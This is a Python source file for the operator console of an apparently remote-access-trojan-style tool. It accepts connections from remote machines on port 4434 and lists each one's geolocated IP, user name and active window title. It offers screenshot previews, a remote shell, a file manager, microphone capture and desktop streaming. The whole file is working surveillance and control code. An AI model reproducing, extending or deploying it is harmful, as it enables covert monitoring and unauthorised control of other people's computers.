# -*- coding: utf-8 -*-

import sys
import socket
import os
import time
import ast
import zlib
import threading
import hashlib
import Image
import string
import random
from threading import Thread
from libs import pygeoip

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ui import gui

from libs.modechat import get, send
from plugins.maudio import main as maudio
from plugins.mexplorer import main as mexplorer
from plugins.mshell import main as mshell
from plugins.mdesktop import main as mdesktop


# initial geo ip database
geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')

# initial assets directories
assets = os.path.join(os.getcwd(), 'assets\\')
flags = os.path.join(assets, 'flags')
temp_folder = os.path.join(os.getcwd(), 'tmp')
if not os.path.exists(temp_folder):
    os.mkdir(temp_folder)


def get_ip_location(ip):
    country_flag = os.path.join(flags, geo_ip_database.country_code_by_addr(ip).lower() + '.png')
    if os.path.exists(country_flag):
        return country_flag
    else:
        return os.path.join(flags, 'blank.png')


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def os_icon(os_type):
    if os_type == "linux" or os_type == "linux2":
        return 'linux.png'
    elif os_type == "darwin":
        return 'mac.png'
    elif os_type == "win32":
        return 'windows.png'


class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, parent=None):
        super(MainDialog, self).__init__(parent)
        self.setupUi(self)

        # sockets Timeout
        self.timeout = None

        # update gui
        self.gui = QApplication.processEvents

        # unlocked servers bank
        self.unlockedSockets = []

        # listen status
        self.acceptthreadState = False

        # plugins bank
        self.pluginsBank = {}
        self.current_sock = ''

        # disable panel buttons
        self.remoteShellButton.setDisabled(True)
        self.remoteExplorerButton.setDisabled(True)
        self.remoteAudioButton.setDisabled(True)
        self.lockServerButton.setDisabled(True)
        self.quitServerButton.setDisabled(True)
        self.unlockServerButton.setDisabled(True)
        self.updatePreviewButton.setDisabled(True)

        # indexes for servers table
        self.index_of_ipAddress = 0
        self.index_of_socket = 1
        self.index_of_lock = 2
        self.index_of_os = 3
        self.index_of_user = 4
        self.index_of_version = 5
        self.index_of_activeWindowTitle = 6
        # initialize servers table columns width
        self.serversTable.setColumnWidth(self.index_of_ipAddress, 150)
        self.serversTable.setColumnWidth(self.index_of_socket, 60)
        self.serversTable.setColumnWidth(self.index_of_lock, 90)
        self.serversTable.setColumnWidth(self.index_of_os, 200)
        self.serversTable.setColumnWidth(self.index_of_user, 100)
        self.serversTable.setColumnWidth(self.index_of_version, 60)
        # servers table double click trigger
        self.serversTable.doubleClicked.connect(self.unlock_server)
        # Initializing right click menu
        self.serversTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.connect(self.serversTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.server_right_click_menu)

        # Triggers
        self.startListenButton.clicked.connect(self.listen_start)
        self.stopListenButton.clicked.connect(self.listen_stop)
        self.serversTable.clicked.connect(self.update_main_menu)

        # Panel Triggers
        self.updatePreviewButton.clicked.connect(self.get_desktop_preview)
        self.unlockServerButton.clicked.connect(self.unlock_server)
        self.lockServerButton.clicked.connect(self.lock_server)
        self.quitServerButton.clicked.connect(self.lock_server)
        self.remoteShellButton.clicked.connect(self.run_shell)
        self.remoteExplorerButton.clicked.connect(self.run_explorer)
        self.remoteAudioButton.clicked.connect(self.run_audio)

        # Custom signal for update server table
        self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
        self.connect(self, SIGNAL('updatePanel()'), self.update_main_menu)
        self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_plugin(plugin='shell'))
        self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
        self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
        self.connect(self, SIGNAL('executeDesktop()'), lambda: self.execute_plugin(plugin='desktop'))

    # Start Listen for Servers
    def listen_start(self):
        # Initializing variables
        if not self.acceptthreadState:
            self.socks = {}
            self.streaming_socks = {}
            self.acceptthreadState = True
            self.listenthread = Thread(target=self.accept_connections, args=(4434,))
            self.listenthread.setDaemon(True)
            self.listenthread.start()
            self.statusLabel.setText('Listening')
            self.statusLabel.setStyleSheet('color: lime; border: none; font: 8pt "MS Shell Dlg 2";')
            self.startListenButton.setChecked(True)
            self.stopListenButton.setChecked(False)
        else:
            self.startListenButton.setChecked(True)

    # Stop Listen for Servers
    def listen_stop(self):
        if self.acceptthreadState:
            self.acceptthreadState = False
            self.serversTable.clearContents()
            self.startListenButton.setChecked(False)
            self.stopListenButton.setChecked(True)
            self.statusLabel.setText('Not Listening')
            self.statusLabel.setStyleSheet('color: #e74c3c; border: none; font: 8pt "MS Shell Dlg 2";')
            self.onlineStatus.setText('0')
            try:
                self.shd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.shd.connect(('127.0.0.1', 4434))
                self.shd.close()
            except:
                pass
        else:
            self.stopListenButton.setChecked(True)

        self.update_main_menu()

    # listen for clients
    # accept connections
    def accept_connections(self, port):

        # Initializing socket
        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # telling the OS that you know what you're doing and you still want to bind to the same port
        self.c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind address
        self.c.bind(('0.0.0.0', int(port)))

        # Start listen for connections
        self.c.listen(128)

        # Start Servers Check Thread
        servers_check_start = threading.Thread(target=self.check_servers)
        servers_check_start.setDaemon(True)
        servers_check_start.start()

        while self.acceptthreadState:
            try:

                # Try accept connection
                self.sock, self.address = self.c.accept()
            except:
                continue

            if not self.acceptthreadState:
                return
            if self.sock:

                data = get(self.sock, 'myinfo', 'status')

                if data == 'parent':

                    data = get(self.sock, 'info', 'pcinfo')
                    info = ast.literal_eval(data)

                    # Set timeout None
                    self.sock.settimeout(self.timeout)

                    # Save connected socket
                    socket_index = self.address[1]
                    self.socks[socket_index] = {}
                    self.socks[socket_index]['sock'] = self.sock
                    self.socks[socket_index]['ip_address'] = self.address[0]
                    self.socks[socket_index]['socket'] = self.address[1]
                    self.socks[socket_index]['ostype'] = info['ostype']
                    self.socks[socket_index]['protection'] = info['protection']
                    self.socks[socket_index]['os'] = info['os']
                    self.socks[socket_index]['user'] = info['user']
                    self.socks[socket_index]['version'] = info['version']
                    self.socks[socket_index]['activewindowtitle'] = info['activewindowtitle']

                    get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')

                else:
                    mode, index = data.split(' ')
                    try:
                        if int(index) in self.socks:
                            i = int(index)

                            if mode == 'streamingMode':

                                data = get(self.sock, 'pcinfo', 'info')
                                info = ast.literal_eval(data)

                                self.streaming_socks[i] = {}
                                self.streaming_socks[i]['sock'] = self.sock
                                self.streaming_socks[i]['protection'] = info['protection']
                                self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                                self.emit(SIGNAL('updateTable()'))

                            self.send_run_signal(self.sock, mode)

                    except ValueError as e:
                        print e

    # Servers Live Update
    def check_servers(self):
        while self.acceptthreadState:
            try:
                for i, k in self.streaming_socks.iteritems():
                    sock = self.streaming_socks[i]['sock']
                    try:
                        data = get(sock, 'pcinfo', mode='pcinfo')
                        info = ast.literal_eval(data)
                        self.streaming_socks[i]['protection'] = info['protection']
                        self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                    except socket.error:
                        del self.socks[i]
                        del self.streaming_socks[i]
                        break
                    except (zlib.error, SyntaxError):
                        pass
            except (RuntimeError, ValueError):
                pass

            self.emit(SIGNAL('updateTable()'))
            self.emit(SIGNAL('updatePanel()'))

            time.sleep(1)

    def get_desktop_preview(self):
        server = self.current_server()
        if server:
            screen_dict = get(self.socks[server]['sock'], 'getScreen', 'screenshot')
            try:
                screen_info = ast.literal_eval(screen_dict)
                width = screen_info['width']
                height = screen_info['height']
                screenbits = screen_info['screenshot']
                path_to_preview = os.path.join(temp_folder, '__preview.png')
                raw = zlib.decompress(screenbits)
                size = (int(width), int(height))
                im = Image.frombuffer('RGB', size, raw, 'raw', 'BGRX', 0, 1)
                im.save(path_to_preview, 'PNG')
                pixmap = QPixmap(path_to_preview).scaled(QSize(280, 175))
                self.previewLabel.setPixmap(pixmap)
            except SyntaxError:
                pass

    # Update Servers Table from self.socks
    def updateServersTable(self):
        self.serversTable.setRowCount(len(self.streaming_socks))
        try:
            for index, obj in enumerate(self.streaming_socks):

                # add ip address & county flag
                ip_address = self.socks[obj]['ip_address']
                item = QTableWidgetItem(ip_address)
                item.setIcon(QIcon(get_ip_location(ip_address)))
                self.serversTable.setItem(index, self.index_of_ipAddress, item)

                # add socket number
                item = QTableWidgetItem(str(self.socks[obj]['socket']))
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.serversTable.setItem(index, self.index_of_socket, item)

                # add server lock status
                lock_status = 'LOCKED' if self.streaming_socks[obj]['protection'] == 'False' else 'UNLOCKED'
                item = QTableWidgetItem(lock_status)
                if lock_status == 'LOCKED':
                    item.setTextColor(QColor('#e74c3c'))
                    item.setIcon(QIcon(os.path.join(assets, 'lock.png')))
                else:
                    item.setTextColor(QColor('lime'))
                    item.setIcon(QIcon(os.path.join(assets, 'unlock.png')))
                self.serversTable.setItem(index, self.index_of_lock, item)

                # add os version
                item = QTableWidgetItem(self.socks[obj]['os'])
                item.setIcon(QIcon(os.path.join(assets, os_icon(self.socks[obj]['ostype']))))
                self.serversTable.setItem(index, self.index_of_os, item)

                # add server user
                item = QTableWidgetItem(self.socks[obj]['user'])
                self.serversTable.setItem(index, self.index_of_user, item)

                # add servers version
                item = QTableWidgetItem(self.socks[obj]['version'])
                item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                self.serversTable.setItem(index, self.index_of_version, item)

                # add active windows title
                item = QTableWidgetItem(self.streaming_socks[obj]['activewindowtitle'])
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                item.setTextColor(QColor('#f39c12'))
                self.serversTable.setItem(index, self.index_of_activeWindowTitle, item)
        except RuntimeError:
            pass

        # update servers online counter
        self.onlineStatus.setText(str(len(self.socks)))

    def unlock_server(self):
        while 1:
            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
                server = self.current_server()
                if server:
                    text, ok = QInputDialog.getText(self, 'Unlock Server', 'Enter Password: ')
                    if ok:
                        _hash = hashlib.md5()
                        _hash.update(str(text))

                        answer = get(self.socks[server]['sock'], _hash.hexdigest(), 'password')
                        if 'iamactive' in answer:
                            break
                    else:
                        break
            else:
                break

    def lock_server(self):
        server = self.current_server()
        if server:
            send(self.socks[server]['sock'], 'lock')

    def update_main_menu(self):
        try:
            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
                self.unlockServerButton.setVisible(True)
                self.unlockServerButton.setDisabled(False)
                self.updatePreviewButton.setDisabled(False)
                self.remoteExplorerButton.setDisabled(True)
                self.remoteShellButton.setDisabled(True)
                self.remoteAudioButton.setDisabled(True)
                self.lockServerButton.setVisible(False)
                self.lockServerButton.setDisabled(True)
                self.quitServerButton.setDisabled(True)
            else:
                self.remoteExplorerButton.setDisabled(False)
                self.remoteShellButton.setDisabled(False)
                self.remoteAudioButton.setDisabled(False)
                self.lockServerButton.setVisible(True)
                self.lockServerButton.setDisabled(False)
                self.quitServerButton.setDisabled(False)
                self.unlockServerButton.setVisible(False)
                self.unlockServerButton.setDisabled(True)
                self.updatePreviewButton.setDisabled(False)
        except:
            self.remoteExplorerButton.setDisabled(True)
            self.remoteShellButton.setDisabled(True)
            self.remoteAudioButton.setDisabled(True)
            self.lockServerButton.setVisible(False)
            self.lockServerButton.setDisabled(True)
            self.quitServerButton.setDisabled(True)
            self.unlockServerButton.setVisible(True)
            self.unlockServerButton.setDisabled(True)
            self.updatePreviewButton.setDisabled(True)
            self.previewLabel.setPixmap(QPixmap(os.path.join(assets, 'monitor.png')).scaled(QSize(280, 175)))

    def server_right_click_menu(self, point):
        server_index = self.serversTable.currentRow()
        self.eMenu = QMenu(self)
        self.optionsMenu = QMenu('Server Options', self)
        self.optionsMenu.setIcon(QIcon(os.path.join(assets, 'settings.png')))

        if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
            self.eMenu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)

        else:
            self.eMenu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell', self.run_shell)
            self.eMenu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
                                 self.run_explorer)
            self.eMenu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Microphone', self.run_audio)
            self.eMenu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')), 'Desktop Streaming', self.run_desktop)

            self.eMenu.addSeparator()
            self.eMenu.addMenu(self.optionsMenu)
            self.optionsMenu.addAction(QIcon(os.path.join(assets, 'lock.png')), 'Lock Server',
                                       self.lock_server)
            self.optionsMenu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
                                       self.lock_server)
        self.eMenu.exec_(self.serversTable.mapToGlobal(point))

    # get item
    def current_server(self):
        try:
            return int(self.serversTable.item(self.serversTable.currentRow(), self.index_of_socket).text())
        except AttributeError:
            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No Server Selected', QMessageBox.Ok)
            warn.exec_()
            return False

    def send_run_signal(self, sock, signal):
        signals = {
            'shellMode': 'executeShell()',
            'explorerMode': 'executeExplorer()',
            'audioMode': 'executeAudio()',
            'desktopMode': 'executeDesktop()',
        }
        if signal in signals:
            self.current_sock = sock
            self.emit(SIGNAL(signals[signal]))

    def execute_plugin(self, plugin):
        plugins = {
            'shell': mshell,
            'explorer': mexplorer,
            'audio': maudio,
            'desktop': mdesktop,
        }

        server = self.current_server()
        if server:
            args = {
                'sock': self.current_sock,
                'socket': self.socks[server]['socket'],
                'ipAddress': self.socks[server]['ip_address'],
                'tempPath': temp_folder
            }
            plugin_id = id_generator()
            if plugin in plugins:
                self.pluginsBank[plugin_id] = plugins[plugin].mainPopup(args)
                self.pluginsBank[plugin_id].show()

    def run_shell(self):
        server = self.current_server()
        if server:
            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'shellMode')

    def run_explorer(self):
        server = self.current_server()
        if server:
            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'explorerMode')

    def run_audio(self):
        server = self.current_server()
        if server:
            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'audioMode')

    def run_desktop(self):
        server = self.current_server()
        if server:
            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'desktopMode')

    def closeEvent(self, event):
        sys.exit(1)


# Run Application
if __name__ == '__main__':
    app = QApplication(sys.argv)
    form = MainDialog()
    form.show()
    sys.exit(app.exec_())
